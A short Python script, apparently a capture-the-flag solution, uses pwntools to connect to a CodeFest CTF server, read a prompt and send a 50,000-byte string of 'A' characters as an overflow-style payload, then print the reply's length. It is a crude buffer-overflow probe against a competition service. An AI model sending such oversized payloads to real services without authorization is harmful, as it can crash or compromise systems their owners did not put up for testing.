from pwn import *
target = remote("codefest-ctf.iitbhu.tech", 16635)

print(target.recvline().decode())
payload = b"A" * 50000
target.send(payload)
data =target.recvall().decode()

print(len(data))
print(target.recvall().decode())